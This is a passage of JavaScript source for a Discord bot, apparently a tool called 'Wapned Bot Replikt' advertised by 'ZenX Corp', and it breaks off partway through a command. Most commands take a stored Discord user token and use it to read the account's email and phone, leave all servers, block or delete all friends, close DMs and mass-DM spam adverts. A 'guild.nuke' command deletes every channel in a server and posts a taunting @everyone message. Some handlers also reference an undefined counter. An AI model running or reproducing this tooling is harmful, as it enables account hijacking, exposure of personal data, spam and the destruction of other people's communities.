                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_inf = await fetch(`https://discord.com/api/v9/users/@me`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson = await res_inf.json();
            if(res_inf.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`**Global name:** \`${resJson['global_name']}\`\n**ID:** \`${resJson['id']}\`\n**Verificado?:** \`${resJson['verified']}\`\n**Discriminator:** \`${resJson['discriminator']}\`\n**Email:** \`${resJson['email']}\`\n**Número de teléfono:** \`${resJson['phone']}\`\n**Locale:** \`${resJson['locale']}\`\n**MFA activado?:** \`${resJson['mfa_enabled']}\`\n**NSFW allowed:** \`${resJson['nsfw_allowed']}\`\n**Banner:** \`${resJson['banner']}\`\n`).setTitle(`Información de ${resJson['username']}`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.guilds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/guilds`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            const adm_perms = BigInt(0x00000008);
            const adm_counter = resJson.filter(srv => {
                const permissions = BigInt(srv.permissions);
                return (permissions & adm_perms) !== BigInt(0);
            }).length;
            let srv_owner = resJson.filter(srv => srv.owner).length;
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Total de servidores:** \`${resJson.length}\`\n**Total de servidores con owner:** \`${srv_owner}\`\n**Total de servidores con administrador:** \`${adm_counter}\``).setTitle(`Información sobre los servidores:`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.admin-guilds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/guilds`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            const adm_perms = BigInt(0x00000008);
            const adm_counter = resJson.filter(srv => {
                const permissions = BigInt(srv.permissions);
                return (permissions & adm_perms) !== BigInt(0);
            }).length;
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Total de servidores:** \`${resJson.length}\`\n**Total de servidores con administrador:** \`${adm_counter}\``).setTitle(`Información sobre los servidores:`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.owner-guilds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/guilds`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            let srv_owner = resJson.filter(srv => srv.owner).length;
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Total de servidores:** \`${resJson.length}\`\n**Total de servidores con owner:** \`${srv_owner}\``).setTitle(`Información sobre los servidores:`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.leave-guilds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/guilds`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson_gld = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            await wait_ms(500);
            let gl_cnt=0;
            async function leave_gl(id_gl) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/users/@me/guilds/${id_gl}`,{
                        method:"DELETE",
                        headers:{
                            "Authorization":`${tkn}`
                        }
                    });
                    if(res.status === 429){
                        const resJson = await res.json();
                        await wait_ms(resJson['retry_after']+300);
                        await leave_gl(id_gl);
                        return;
                    };
                    if(res.status !== 204){
                        return;
                    };
                    gl_cnt++;
                } catch (e) {};
            };
            for (let index = 0; index < resJson_gld.length; index++) {
                await leave_gl(resJson_gld[index]['id']);
                await wait_ms(1_100);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se abandonó ${gl_cnt} servidores!`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.create-guilds"){
        try {
            //Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp e.e
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            } else {
                await msg.channel.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            };
        } catch (e) {
            console.log(e);
        };
    };
    if(msg.content === prefix_2+"token.block-friends"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_usr = await fetch(`https://discord.com/api/v9/users/@me/relationships`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson_rl = await res_usr.json();
            if(res_usr.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            let fr_cont=0;
            async function bloq_rl(id_rl) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/users/@me/relationships/${id_rl}`, {
                        method: 'PUT',
                        headers: {
                            'Authorization': `${tkn}`,
                            "content-type":"application/json"
                        },
                        body:JSON.stringify({
                            "type":2
                        })
                    });
                    const resJson = await res.json();
                    if(res.status !== 204){
                        await wait_ms(resJson['retry_after']+500);
                        await bloq_rl(id_rl);
                        return;
                    };
                    fr_cont++;
                } catch (e) {};
            };
            for (let index = 0; index < resJson_rl.length; index++) {
                await bloq_rl(resJson_rl[index]['id']);
                await wait_ms(1_500);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se bloqueó ${fr_cont} usuarios.`)]});
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se cerró ${delmd_cnt} MDS!`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.delete-friends"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_usr = await fetch(`https://discord.com/api/v9/users/@me/relationships`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson_rl = await res_usr.json();
            if(res_usr.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            let fr_cont=0;
            async function del_rl(id_rl) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/users/@me/relationships/${id_rl}`, {
                        method: 'DELETE',
                        headers: {
                            'Authorization': `${tkn}`,
                        }
                    });
                    const resJson = await res.json();
                    if(res.status !== 204){
                        await wait_ms(resJson['retry_after']+500);
                        await del_rl(id_rl);
                        return;
                    };
                    fr_cont++;
                } catch (e) {};
            };
            for (let index = 0; index < resJson_rl.length; index++) {
                await del_rl(resJson_rl[index]['id']);
                await wait_ms(1_500);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se eliminó ${fr_cont} amigos.`)]});
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se cerró ${delmd_cnt} MDS!`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.close-mds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/channels`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson_md = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            await wait_ms(500);
            let delmd_cnt=0;
            async function del_md(id_md) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${id_md}?silent=false`,{
                        method:"DELETE",
                        headers:{
                            "Authorization":`${tkn}`
                        }
                    });
                    if(res.status === 429){
                        const resJson = await res.json();
                        await wait_ms(resJson['retry_after']+300);
                        await del_md(id_md);
                        return;
                    };
                    if(res.status !== 200){
                        return;
                    };
                    delmd_cnt++;
                } catch (e) {console.log(e.message)};
            };
            for (let index = 0; index < resJson_md.length; index++) {
                await del_md(resJson_md[index]['id']);
                await wait_ms(1_100);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se cerró ${delmd_cnt} MDS!`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.theme-spam"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_usr = await fetch(`https://discord.com/api/v9/users/@me`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            if(res_usr.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            await wait_ms(500);
            const th_nm = ["dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light","dark","light"];
            //si un dev mira esto, lo pude haber hecho mejor XDDDDDDDDDD
            //:,v
            let th_cont=0;
            async function theme_spam(theme_nm) {
                try {
                    const res = await fetch(`https://discord.com/api/v10/users/@me/settings`,{
                        method:"PATCH",
                        headers:{
                            "Authorization": `${tkn}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            theme:theme_nm
                        })
                    });
                    const resJson = await res.json();
                    if(res.status !== 200){
                        await wait_ms(resJson['retry_after']+500);
                        await theme_spam(theme_nm);
                        return;
                    };
                    th_cont++;
                } catch (e) {
                    console.log(e.message)
                };
            };
            for (let index = 0; index < th_nm.length; index++) {
                await theme_spam(th_nm[index]);
                await wait_ms(1_000);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se cambió de tema ${th_cont} veces.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.region-spam"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            //No entendí como era esta parte porque esto solo aparece cuando un weon anda en call XDDD
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se cerró ${delmd_cnt} MDS!`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.spam-mds"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let tkn = users_data[msg.author.id]?.token_selected ? users_data[msg.author.id].token_selected : "No definido.";
            if(tkn === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ningún token de usuario especificado.`)]});
                return;
            };
            const res_gld = await fetch(`https://discord.com/api/v9/users/@me/channels`,{
                method:"GET",
                headers:{
                    "Authorization": `${tkn}`
                }
            });
            const resJson_md = await res_gld.json();
            if(res_gld.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            await wait_ms(500);
            let spam_dm_cont=0;
            let messages_conterpe=0;
            async function spam_dm(id_md, id_usr) {
                try {
                    for (let index = 0; index < 5; index++) {
                        try {
                            const res = await fetch(`https://discord.com/api/v9/channels/${id_md}/messages`,{
                                method:"POST",
                                headers:{
                                    "Authorization":`${tkn}`,
                                    "Content-Type":"Application/json"
                                },
                                body: JSON.stringify({
                                    content:`**<@${id_usr}>** Únete a $ ZenX Corp bro https://discord.gg/zCQ8jQ2GBf - #WapnedBot Replikt`
                                })
                            });
                            if(res.status === 429){
                                const resJson = await res.json();
                                await wait_ms(resJson['retry_after']+300);
                                await spam_dm(id_md);
                                return;
                            };
                            if(res.status !== 200){
                                return;
                            };
                            messages_conterpe++;
                            await wait_ms(500);
                        } catch (e) {console.log(e.message)};
                    };
                } catch (e) {console.log(e.message)};
            };
            for (let index = 0; index < resJson_md.length; index++) {
                spam_dm_cont++;
                await spam_dm(resJson_md[index]['id'], resJson_md[index]['recipients'][0]['id']);
                await wait_ms(2_000);
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se envió mensajes en ${spam_dm_cont} chats.`)]})
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se envió ${messages_conterpe} mensajes.`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_2 === "select-guild"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            const res = await fetch(`https://discord.com/api/v9/guilds/${args2[0]}`,{
                method:"GET",
                headers:{
                    "Authorization": `Bot ${bot_token}`
                }
            });
            const resJson = await res.json();
            if(res.status !== 200){
                if(resJson['code'] === 10004){
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar una guild válida.`)]})
                    return;
                };
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Ocurrió otro problema al verificar la guild.`)]})
                return;
            };
            users_data[msg.author.id] = {
                guild_selected: args2[0]
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se agregó la guild!`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"unselect-guild"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            users_data[msg.author.id] = {
                guild_selected: ""
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se eliminó la guild!`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.info"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            try {
                const res_gld = await fetch(`https://discord.com/api/v9/guilds/${guild_idxd}`,{
                    method:"GET",
                    headers:{
                        "Authorization": `Bot ${bot_token}`
                    }
                });
                if(res_gld.status !== 200){
                    if(res_gld.status === 404){
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El bot no está unido a ese servidor!`)]});
                        return;
                    } else {
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Hubo algún problema al hacer la solicitud.`)]});
                        return;
                    };
                };
            } catch (e) {
                console.log(e.message);
            };
            const guild_idxd_dt = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(guild_idxd_dt.iconURL()).setDescription(`**Nombre:** \`${guild_idxd_dt.name}\`\n**ID:** \`${guild_idxd_dt.id}\`\n**ID del creador:** \`${guild_idxd_dt.ownerId}\`\n\n**Usuarios:** \`${guild_idxd_dt.memberCount}\`\n**Total de canales:** \`${guild_idxd_dt.channels.cache.size}\`\n**Total de roles:** \`${guild_idxd_dt.roles.cache.size}\`\n**Total de emojis:** \`${guild_idxd_dt.emojis.cache.size}\`\n**Total de stickers:** \`${guild_idxd_dt.stickers.cache.size}\``).setTitle(`Información del servidor: ${guild_idxd_dt.name}`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.view-roles"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            try {
                const res_gld = await fetch(`https://discord.com/api/v9/guilds/${guild_idxd}`,{
                    method:"GET",
                    headers:{
                        "Authorization": `Bot ${bot_token}`
                    }
                });
                if(res_gld.status !== 200){
                    if(res_gld.status === 404){
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El bot no está unido a ese servidor!`)]});
                        return;
                    } else {
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Hubo algún problema al hacer la solicitud.`)]});
                        return;
                    };
                };
            } catch (e) {
                console.log(e.message);
            };
            const guild_idxd_dt = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Roles:**\n ${guild_idxd_dt.roles.cache.map(role => `${role.name} - ${role.id}`).join(`\n`)}`).setTitle(`Roles del servidor: ${guild_idxd_dt.name}`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.view-channels"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            try {
                const res_gld = await fetch(`https://discord.com/api/v9/guilds/${guild_idxd}`,{
                    method:"GET",
                    headers:{
                        "Authorization": `Bot ${bot_token}`
                    }
                });
                if(res_gld.status !== 200){
                    if(res_gld.status === 404){
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El bot no está unido a ese servidor!`)]});
                        return;
                    } else {
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Hubo algún problema al hacer la solicitud.`)]});
                        return;
                    };
                };
            } catch (e) {
                console.log(e.message);
            };
            const guild_idxd_dt = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Canales:**\n ${guild_idxd_dt.channels.cache.map(channelll => `${channelll.name} - [${channelll.id}]`).join(`\n`)}`).setTitle(`Canales del servidor: ${guild_idxd_dt.name}`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.view-hooks"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            try {
                const res_gld = await fetch(`https://discord.com/api/v9/guilds/${guild_idxd}`,{
                    method:"GET",
                    headers:{
                        "Authorization": `Bot ${bot_token}`
                    }
                });
                if(res_gld.status !== 200){
                    if(res_gld.status === 404){
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El bot no está unido a ese servidor!`)]});
                        return;
                    } else {
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Hubo algún problema al hacer la solicitud.`)]});
                        return;
                    };
                };
            } catch (e) {
                console.log(e.message);
            };
            const guild_idxd_dt = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Webhooks:**\n ${(await guild_idxd_dt.fetchWebhooks()).map(whxd => `${whxd.name} - ${whxd.url}\n`).join(`\n`)}`).setTitle(`Webhooks del servidor: ${guild_idxd_dt.name}`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === "test"){if(msg.author.id==="1189795248826744958"){await msg.channel.send({content:`replica_wapned`}); await msg.channel.send({content:`replica wapned`})}}
    if(msg.content === prefix_2+"guild.invite"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            try {
                const res_gld = await fetch(`https://discord.com/api/v9/guilds/${guild_idxd}`,{
                    method:"GET",
                    headers:{
                        "Authorization": `Bot ${bot_token}`
                    }
                });
                if(res_gld.status !== 200){
                    if(res_gld.status === 404){
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El bot no está unido a ese servidor!`)]});
                        return;
                    } else {
                        await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Hubo algún problema al hacer la solicitud.`)]});
                        return;
                    };
                };
            } catch (e) {
                console.log(e.message);
            };
            const guild_idxd_dt = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`**Invitaciones:**\n ${(await guild_idxd_dt.invites.fetch()).map(invxd => `** https://discord.gg/${invxd.code} ** - Usos: ${invxd.uses}`).join(`\n`)}`).setTitle(`Invitaciones del servidor: ${guild_idxd_dt.name}`)]})
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.nuke"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            let nk = false;
            let nk_number = 0;
            async function delete_ch(ch_id, ch_size) {
                const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                    method:"DELETE",
                    headers:{
                        "Authorization":`Bot ${bot_token}`,
                        "Content-Type":"application/json"
                    },
                    body: JSON.stringify({
                        "X-Audit-Log-Reason":"$ ZenX Corp"
                    })
                });
                const resJson = await res.json();
                if(res.status === 429){
                    console.log(chalk.cyan(`[i] Se detectó rate limite de ${chalk.white(`${resJson['retry_after']}`)}, reintentando...`));
                    await wait_ms(resJson['retry_after']);
                    await delete_ch(ch_id);
                };
                if(res.status === 200){
                    nk_number++;
                };
                if(!nk && nk_number === ch_size){
                    nk = true;
                    await guildxd.channels.create({type:ChannelType.GuildText, name:`nuked-by-zenx`}).then(async(ch)=>{await ch.send({content:` https://discord.gg/zCQ8jQ2GBf \n https://discord.gg/RR2qSCG45d \n@everyone`, embeds:[
                        new EmbedBuilder()
                        .setTitle(` ‎                           ‎ **SERVER FUCKED BY ZENX**\n ‎                                 ‎ **#WAPNED REPLIKT**`)
